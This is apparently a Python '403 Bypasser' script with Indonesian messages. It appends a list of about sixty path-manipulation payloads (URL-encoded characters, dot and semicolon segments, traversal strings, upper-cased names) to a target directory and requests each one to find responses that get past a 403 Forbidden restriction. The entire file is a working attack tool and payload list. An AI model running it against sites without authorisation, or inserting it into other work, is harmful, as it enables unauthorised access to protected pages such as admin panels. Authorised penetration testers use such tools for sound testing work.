import requests
import sys
import os
from colorama import Fore, Style, init

# Inisialisasi colorama
init(autoreset=True)

os.system('clear')

print("""
____
, =, ( _________
| ='  (VvvVvV--' 403 Bypasser - VesperaIX
|____(
             
  """)

def generate_payloads(directory):
    payloads = [
        '?',
        '/.',
        '//',
        '///',
        './',
        '?',
        '??',
        '??/',
        '?/',
        '../',
        '/./',
        '.',
        './/',
        '*',
        '//*/',
        '%2f',
        '%2f/',
        '%20',
        '%20/',
        '%09',
        '%09/',
        '%0a',
        '%0a/',
        '%0d',
        '%0d/',
        '%25',
        '%25/',
        '%23',
        '%23/',
        '%26',
        '%3f',
        '%3f/',
        '%26/',
        '#',
        '#/',
        '#/./',
        '/./',
        '/..;',
        '/.;',
        '/;',
        '//;//',
        '%2e/',
        '%20/%20',
        '../..;/',
        '.json',
        '..;/',
        ';/',
        '%00',
        '.css',
        '.html',
        '?id=1',
        '~',
        '/~',
        '°/',
        '&',
        '-',
        '\/\/',
        '..%3B/',
        ';%2f..%2f..%2f',
        f'{directory.upper()}',
        f'{directory.upper()}/',
        f'{directory}/{directory}..\\;',
        f'*/{directory}'
    ]
    return payloads

def check_403_bypass(url, directory):
    if not url.endswith('/'):
        print("Perhatian: URL harus diakhiri dengan '/'")
        sys.exit(1)
    
    if directory.endswith('/'):
        print("Perhatian: Direktori tidak boleh diakhiri dengan '/'")
        sys.exit(1)

    payloads = generate_payloads(directory)
    full_urls = [f"{url}{directory}{payload}" for payload in payloads]
    
    print(f"Scanning URL: {url}{directory}\n")

    for full_url in full_urls:
        try:
            response = requests.get(full_url, timeout=5)
            if response.status_code == 403:
                print(f"[{Fore.RED}403{Style.RESET_ALL}] - {full_url}")
            elif response.status_code == 404:
                print(f"[{Fore.YELLOW}404{Style.RESET_ALL}] - {full_url}")
            else:
                print(f"[{Fore.GREEN}{response.status_code}{Style.RESET_ALL}] - {full_url}")
        except requests.RequestException as e:
            print(f"[ERROR] - {full_url} - {e}")

if __name__ == "__main__":
    try:
        if len(sys.argv) != 3:
            print("Usage: python3 bypass.py <target_url> <directory>")
            print("Example: python3 bypass.py https://example.com/ admin")
            sys.exit(1)

        target_url = sys.argv[1]
        target_directory = sys.argv[2]

        check_403_bypass(target_url, target_directory)

    except KeyboardInterrupt:
        print("\nKeluar")
        sys.exit(0)
